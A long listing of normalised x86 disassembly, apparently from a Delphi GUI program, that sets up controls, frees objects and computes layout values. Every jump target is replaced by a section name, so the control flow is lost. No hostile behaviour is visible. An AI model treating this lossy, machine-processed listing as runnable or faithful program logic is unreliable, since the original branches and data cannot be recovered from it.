jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x74 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x4 ]
call sub_419f58
mov edx eax
mov eax ebx
call sub_46a774
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
sub_46ce2c
push ebx
push esi
push edi
push ebp
push ecx
call sub_403524
mov [ esp ] dl
mov ebp eax
lea eax [ ebp + 0xa4 ]
call sub_40d3ac
mov eax ebp
call sub_46a7b0
lea eax [ ebp + 0x48 ]
call sub_40d3ac
mov eax [ ebp + 0x60 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx + 0x98 ]
lea eax [ ebp + 0x60 ]
call sub_40d3ac
mov ebx [ ebp + 0x80 ]
mov esi [ ebx + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax [ ebp + 0x80 ]
call sub_403198
mov eax [ ebp + 0x3c ]
call sub_403198
mov eax [ ebp + 0x88 ]
call sub_403198
mov eax [ ebp + 0x64 ]
call sub_403198
cmp [ ebp + 0x68 ] 0x0
je r-xdata
inc esi
xor edi edi
mov eax [ ebp + 0x60 ]
mov edx edi
call sub_414098
mov edx ebp
call sub_46cc74
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebp
call sub_419a9c
cmp [ esp ] 0x0
jle r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov edx edi
mov eax ebx
call sub_469f9c
call sub_403198
inc edi
dec esi
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_40350c
sub_46cf30
push ebx
push esi
push edi
push ebp
mov edi eax
xor ebp ebp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc ebp
mov edx esi
mov eax edi
call sub_414098
cmp [ eax + 0x30 ] 0x0
je r-xdata
sub_46cf60
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_461b34
mov [ ebx + 0x302 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov esi eax
mov [ ebx + 0x2e8 ] esi
mov [ esi + 0x10 ] ebx
mov [ ebx + 0x300 ] 0x1
mov [ ebx + 0x301 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebx + 0x348 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_464b98
mov esi eax
mov [ ebx + 0x2f4 ] esi
mov [ esi + 0x8e ] 0x1
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_464b98
mov esi eax
mov [ ebx + 0x2f0 ] esi
mov eax esi
mov [ eax + 0x8e ] 0x1
mov [ eax + 0x8f ] 0x1
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_464b98
mov esi eax
mov [ ebx + 0x2f8 ] esi
mov eax [ esi + 0x30 ]
mov [ eax + 0xc ] 0x5a
mov [ esi + 0xd0 ] 0x5a
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_464b98
mov esi eax
mov [ ebx + 0x2fc ] esi
mov eax esi
mov edx [ eax + 0x30 ]
mov [ edx + 0xc ] 0x10e
mov [ eax + 0xd0 ] 0x10e
mov [ eax + 0x8f ] 0x1
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_464b98
mov esi eax
mov [ ebx + 0x2ec ] esi
mov eax esi
mov [ eax + 0x94 ] 0x0
mov [ eax + 0xe0 ] 0x1
mov [ eax + 0x8f ] 0x1
mov [ ebx + 0x330 ] 0x1
mov [ ebx + 0x338 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_46d0bc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov si 0xffb1
call sub_403394
cmp eax edi
jge r-xdata
cmp edi 0x1
jge r-xdata
mov edi eax
cmp edi [ ebx + 0x330 ]
je r-xdata
mov edi 0x1
pop edi
pop esi
pop ebx
retn
lea edx [ ebx + 0x330 ]
mov ecx edi
mov eax ebx
call sub_4614d8
cmp [ ebx + 0x31a ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x31c ]
call [ ebx + 0x318 ]
sub_46d124
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] 0x1
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2e8 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebp - 0xc ] 0x0
jle r-xdata
inc esi
xor edi edi
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x334 ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
test edx edx
jle r-xdata
inc edi
dec esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x94 ]
test al al
je r-xdata
inc [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx edi
call sub_46da00
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
je r-xdata
cmp [ ebp - 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_46b9bc
mov [ ebp - 0xc ] eax
mov [ ebp - 0xd ] 0x0
mov eax ebx
call sub_46b9bc
cmp eax [ ebp - 0xc ]
jle r-xdata
sub_46d1d8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x334 ] 0x0
jle r-xdata
mov eax 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2e8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_46da00
call sub_46a554
test al al
je r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2fc ]
call sub_46d124
pop ecx
push eax
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2f8 ]
call sub_46d124
pop ecx
pop edx
call sub_460384
pop ecx
pop ebp
retn
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2f4 ]
call sub_46d124
pop ecx
push eax
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2f0 ]
call sub_46d124
pop ecx
pop edx
call sub_460384
jmp r-xdata
pop ecx
pop ebp
retn
sub_46d268
push ebp
mov ebp esp
push 0x0
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_46d2eb
push [ fs : eax ]
mov [ fs : eax ] esp
test edx edx
jge r-xdata
lea eax [ edi + 0x334 ]
mov ecx edx
mov edx edi
xchg edx eax
call sub_4614d8
mov eax edi
mov si 0xffb1
call sub_403394
cmp eax [ edi + 0x330 ]
jge r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d2f2
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x104 ]
sub_46d2f8
push ebx
push esi
mov esi eax
jmp r-xdata
mov eax esi
call sub_46e68c
test eax eax
jg r-xdata
xor edx edx
mov eax esi
call sub_46da00
mov ebx eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov eax ebx
call sub_403198
pop esi
pop ebx
retn
sub_46d328
push ebx
push esi
push edi
call sub_403524
mov ebx edx
mov esi eax
mov eax esi
call sub_46d2f8
mov eax [ esi + 0x2e8 ]
call sub_403198
mov edi [ esi + 0x348 ]
jmp r-xdata
cmp [ edi + 0x8 ] 0x0
jg r-xdata
mov eax edi
call sub_414090
call sub_403198
xor edx edx
mov eax edi
call sub_413f38
mov eax [ esi + 0x348 ]
call sub_403198
mov edx ebx
and dl 0xfc
mov eax esi
call sub_461bc8
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_46d390
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x302 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp ]
cmp [ eax + 0x94 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov bl 0x1
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
cmp [ eax + 0xe0 ] 0x0
je r-xdata
mov eax [ esi + 0x2e8 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov bl [ esi + 0x278 ]
jmp r-xdata
inc ebp
mov [ esp + 0x4 ] 0x0
inc [ esp + 0x4 ]
dec ebp
jne r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x13c ]
test al al
je r-xdata
mov edx [ esp + 0x4 ]
mov eax esi
call sub_46da00
mov edi eax
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov edx [ esp ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x94 ]
mov ebx eax
test bl bl
jne r-xdata
sub_46d42c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x2e8 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov al 0x1
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x94 ]
test al al
je r-xdata
mov edx edi
mov eax ebp
call sub_46da00
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_46d47c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xe0 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46e3c8
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_465b74
cmp al 0x2
jne r-xdata
mov al [ ebp + 0x8 ]
mov eax esi
call sub_46a554
test al al
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0x2e8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp - 0x19 ] 0x1
mov eax [ ebx + 0x2e8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
test esi esi
je r-xdata
mov al [ ebp + 0x8 ]
xor al 0x1
jmp r-xdata
mov al [ ebp + 0x8 ]
jmp r-xdata
fild [ ebx + 0x33c ]
fadd [ r-xdata ]
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xbfe00000
jmp r-xdata
fld [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc edi
xor esi esi
inc edi
mov [ ebp - 0x14 ] 0x0
mov eax esi
call sub_46b9bc
test eax eax
jle r-xdata
cmp [ ebx + 0x334 ] 0x0
setg dl
test dl al
je r-xdata
inc esi
dec edi
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax esi
call sub_46b9bc
test eax eax
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46d42c
test al al
je r-xdata
mov edi [ ebx + 0x330 ]
dec edi
imul edi [ ebx + 0x334 ]
mov eax esi
call sub_46b9bc
mov [ ebp - 0x18 ] eax
cmp edi [ ebp - 0x18 ]
jl r-xdata
mov edx esi
mov eax ebx
call sub_46da00
cmp [ eax + 0x30 ] 0x0
je r-xdata
jmp r-xdata
mov edx [ eax ]
call [ edx + 0xc8 ]
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
mov edx [ eax ]
call [ edx + 0xd4 ]
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
inc [ ebp - 0x14 ]
dec edi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ecx [ ebx + 0x334 ]
mov eax ecx
add eax edi
dec eax
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x2c ]
jg r-xdata
mov eax [ ebp - 0x18 ]
cdq
idiv [ ebx + 0x334 ]
mov edx eax
dec edx
xor eax eax
call sub_460384
mov edi eax
imul edi [ ebx + 0x334 ]
mov edx [ ebp - 0x14 ]
mov eax ebx
call sub_46da00
mov esi eax
cmp [ esi + 0x30 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ esi + 0x90 ] 0x2
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
cdq
idiv ecx
add edx edi
dec edx
mov [ ebp - 0x2c ] edx
cmp [ esi + 0xa0 ] 0x2
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ esi + 0x50 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov ecx [ ebp - 0x2c ]
mov dl [ ebp + 0x8 ]
mov eax esi
call sub_46ac3c
fstp [ ebp - 0x10 ]
fwait
cmp [ ebx + 0x338 ] 0x0
jne r-xdata
mov ecx edi
mov dl [ ebp + 0x8 ]
mov eax esi
call sub_46ac3c
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
mov eax [ esi + 0x54 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x2c ]
sub eax edi
inc eax
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x30 ]
cmp eax [ ebx + 0x334 ]
jge r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
fstp [ ebp - 0x28 ]
fwait
mov eax esi
mov edx [ eax ]
call [ edx + 0xc0 ]
fstp [ ebp - 0x28 ]
fwait
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xd0 ]
fstp [ ebp - 0x28 ]
fwait
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
fstp [ ebp - 0x28 ]
fwait
jmp r-xdata
mov ecx edi
mov dl [ ebp + 0x8 ]
mov eax esi
call sub_46ac3c
fstp [ ebp - 0x28 ]
fwait
fld [ ebp - 0x10 ]
fsub [ ebp - 0x28 ]
fild [ ebx + 0x334 ]
fmulp st1
fild [ ebp - 0x30 ]
fdivp st1
fadd [ ebp - 0x28 ]
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x19 ] 0x0
cmp [ ebp - 0x5 ] 0x0
je r-xdata
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
fld [ ebp - 0x28 ]
fcomp [ ebp - 0x10 ]
fnstsw ax
sahf
jb r-xdata
fld [ ebp - 0x28 ]
fcomp [ ebp - 0x10 ]
fnstsw ax
sahf
jbe r-xdata
sub_46d7f4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
xor ebp ebp
mov eax [ edi + 0x2e8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_46da00
cmp [ eax + 0x30 ] 0x0
je r-xdata
cmp ebp [ esp ]
jne r-xdata
inc ebp
mov edx esi
mov eax edi
call sub_46da00
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_46d844
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
xor edx edx
push ebp
push sub_46d8c4
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx edi
call sub_46d7f4
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_403ee8
cmp [ ebx + 0x78 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x78 ]
call sub_403f3c
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403f3c
cmp [ esi ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d8cb
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
lea edx [ ebp - 0x4 ]
mov eax edi
call sub_407f38
mov ecx [ ebp - 0x4 ]
mov eax esi
mov edx r-xdata
call sub_4041f4
jmp r-xdata
sub_46d8e4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46d99f
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2e8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d9a6
lea eax [ ebp - 0x1c ]
call sub_403ee8
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax esi
call sub_46b9bc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_46da00
mov esi eax
mov eax [ esi + 0x88 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
mov [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0x60 ]
mov edx [ ebp - 0x1c ]
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_461614
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_460384
mov [ ebp - 0x8 ] eax
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_46d9b0
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x2e8 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_46cbc4
mov edx eax
mov eax [ esp ]
call sub_460384
mov [ esp ] eax
mov edx edi
mov eax ebp
call sub_46da00
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
je r-xdata
sub_46da18
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
cmp [ ebx + 0x278 ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x340 ] eax
xor eax eax
mov [ ebx + 0x344 ] eax
xor eax eax
mov [ ebx + 0x280 ] eax
xor eax eax
mov [ ebx + 0x254 ] eax
fild [ ebx + 0x228 ]
fld [ r-xdata ]
fmulp st1
fstp [ esp ]
fwait
mov eax [ ebx + 0x27c ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
fild [ ebx + 0x240 ]
fmul [ esp ]
call sub_402990
mov esi eax
mov [ ebx + 0x340 ] esi
mov [ ebx + 0x344 ] esi
cmp [ ebx + 0x22c ] 0x0
je r-xdata
fld [ esp ]
fmul [ r-xdata ]
fstp [ esp ]
fwait
mov eax 0x1
mov edx [ ebx + 0x33c ]
inc edx
mov eax 0x1
call sub_460384
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov edx [ ebx + 0x344 ]
imul edx eax
mov [ ebx + 0x254 ] edx
mov edx [ ebx + 0x340 ]
imul edx eax
mov [ ebx + 0x280 ] edx
jmp r-xdata
sub_46daec
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4613ec
test al al
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x280 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
lea edx [ eax + 0x28e ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x288 ]
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0xc0 ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1 ] 0x1
sub_46db44
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x288 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1 ] 0x0
sub_46db70
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_46cf04
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_46cf04
cmp esi eax
jne r-xdata
mov eax ebx
call sub_46b9bc
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
sub_46dbb8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x8 ]
mov edi [ edi + 0x8 ]
add edi 0xfffffffc
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x2e8 ]
call sub_4140f4
mov ebx eax
mov eax [ edi ]
mov eax [ eax + 0x2e8 ]
mov esi [ eax + 0x8 ]
dec esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_46b9bc
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub esi ebx
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10c ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xchg esi ebx
sub ebx esi
jg r-xdata
sub esi ebx
jl r-xdata
push ebp
mov eax [ edi ]
mov edx esi
call sub_46da00
call sub_46db70
pop ecx
inc esi
dec ebx
jne r-xdata
dec ebx
inc esi
xchg esi ebx
push ebp
mov eax [ edi ]
mov edx esi
call sub_46da00
call sub_46db70
pop ecx
dec esi
inc ebx
jne r-xdata
jmp r-xdata
push ebp
mov eax [ edi ]
mov edx esi
call sub_46da00
call sub_46db70
pop ecx
inc esi
dec ebx
jne r-xdata
jmp r-xdata
sub_46dc6c
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x64 ]
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x11 ] 0x0
je r-xdata
mov eax esi
call sub_46b4ec
cmp [ ebx + 0x11 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_46daec
pop ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_46db44
pop ecx
sub_46dca8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x278 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_46ace8
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4c ] 0xffffffff
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x70 ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x301 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_46b440
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x50 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x301 ] 0x0
je r-xdata
push ebp
call sub_46daec
pop ecx
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2e8 ]
mov edx [ ebp - 0x8 ]
call sub_4140f4
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2e8 ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
push ebp
mov eax [ ebp - 0x8 ]
call sub_46dc6c
pop ecx
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
push ebp
call sub_46db44
pop ecx
cmp [ ebp - 0xc ] 0xffffffff
je r-xdata
inc ebx
push ebp
call sub_46db44
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2e8 ]
mov edx [ ebp - 0x8 ]
call sub_4140f4
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2e8 ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x108 ]
test al al
je r-xdata
inc esi
dec ebx
jne r-xdata
mov eax edi
call sub_46cf04
push eax
mov eax [ ebp - 0x8 ]
call sub_46cf04
pop edx
cmp edx eax
jne r-xdata
inc ebx
mov esi [ ebp - 0x10 ]
mov ebx [ ebp - 0xc ]
sub ebx esi
jg r-xdata
mov esi [ ebp - 0xc ]
mov ebx [ ebp - 0x10 ]
sub ebx esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_46da00
mov edi eax
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov eax edi
call sub_46ace8
mov eax [ edi + 0x4c ]
cmp eax 0xffffffff
je r-xdata
inc esi
dec ebx
jne r-xdata
mov eax edi
call sub_46cf04
push eax
mov eax [ ebp - 0x8 ]
call sub_46cf04
pop edx
cmp edx eax
jne r-xdata
dec ebx
inc ebx
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_46da00
mov edi eax
cmp [ edi + 0x30 ] 0x0
je r-xdata
jmp r-xdata
cmp [ edi + 0x4c ] 0xffffffff
je r-xdata
push ebp
mov eax esi
call sub_46dbb8
pop ecx
dec esi
inc ebx
jne r-xdata
push ebp
mov eax esi
call sub_46dbb8
pop ecx
inc esi
dec ebx
jne r-xdata
jmp r-xdata
mov edx eax
mov eax [ ebp - 0xc ]
call sub_460384
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] eax
jmp r-xdata
push ebp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_46da00
call sub_46dc6c
pop ecx
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
mov edx [ edi + 0x5c ]
mov eax [ ebp - 0x10 ]
call sub_460384
mov [ ebp - 0x10 ] eax
mov eax [ edi + 0x5c ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x4c ]
mov eax [ ebp + 0x8 ]
